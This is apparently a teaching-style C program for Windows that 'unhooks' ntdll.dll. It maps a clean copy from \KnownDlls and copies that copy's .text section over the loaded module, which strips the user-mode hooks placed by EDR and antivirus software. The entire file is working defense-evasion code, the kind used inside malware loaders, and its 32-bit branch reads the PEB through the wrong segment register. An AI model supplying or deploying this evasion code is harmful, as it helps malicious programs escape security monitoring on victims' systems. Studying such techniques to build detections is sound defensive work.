#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#define NTDLL	L"\\KnownDlls\\ntdll.dll"

typedef NTSTATUS (NTAPI* NTOPENSECTION)(
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
);

/**
 * Fetching local NTDLL.
 */
PVOID GetLocalNtdllAddress(){
    #ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    #elif _WIN32
    PPEB pPeb = (PPEB)__readgsqword(0x30);
    #endif

    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10); //The size of the LIST_ENTRY structure is 0x10,
    return pLdr->DllBase;
}

/**
 * Map NTDLL from KnowDll's
 */
BOOL MapNtdllFromKnowDlls(OUT PVOID* ppNtdllBuf){
    HANDLE hSection          = NULL;
    PBYTE  pNtdllBuffer      = NULL;

    NTSTATUS          STATUS = NULL;
    UNICODE_STRING    UniStr = {0};
    OBJECT_ATTRIBUTES ObjAtr = {0};

    UniStr.Buffer = (PWSTR)NTDLL;
    UniStr.Length = wcslen(NTDLL) * sizeof(WCHAR);
    UniStr.MaximumLength = UniStr.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&ObjAtr, &UniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTOPENSECTION pNtOpenSection = (NTOPENSECTION)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtOpenSection");
    if(pNtOpenSection == NULL){
        printf("[!] Unable to retrieve address of NtOpenSection with error : %d\n", GetLastError());
        goto _EndFunc;
    }

    STATUS = pNtOpenSection(&hSection, SECTION_MAP_READ, &ObjAtr);
    if(STATUS != 0x00){
        printf("[!] NtOpenSection failed with error : %d\n", GetLastError());
        goto _EndFunc;
    }

    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (pNtdllBuffer == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		goto _EndFunc;
	}

    *ppNtdllBuf = pNtdllBuffer;

_EndFunc:
    if(hSection){
        CloseHandle(hSection);
    }

    return !(*ppNtdllBuf == NULL);
}

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
	PVOID				pLocalNtdll = (PVOID)GetLocalNtdllAddress();

	printf("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
        return FALSE;
    }

	PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
				pRemoteNtdllTxt = NULL; // the unhooked text section base address

	SIZE_T		sNtdllTxtSize	= NULL;	// the size of the text section

	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt	= (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

//---------------------------------------------------------------------------------------------------------------------------
	
	printf("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize){
        return FALSE;
    }

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt){
        return FALSE;
    }

//---------------------------------------------------------------------------------------------------------------------------
	
	printf("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// restoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");
	return TRUE;
}

int main(){
    PVOID	pNtdll = NULL;

	printf("[*] Fetching A New \"ntdll.dll\" File from \"\\KnownDlls\\\" \n");

	if (!MapNtdllFromKnowDlls(&pNtdll)){
        return EXIT_FAILURE;
    }

	if (!ReplaceNtdllTxtSection(pNtdll)){
        return EXIT_FAILURE;
    }

	UnmapViewOfFile(pNtdll);
	printf("[+] Ntdll Unhooked Successfully \n");
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

    return EXIT_SUCCESS;
}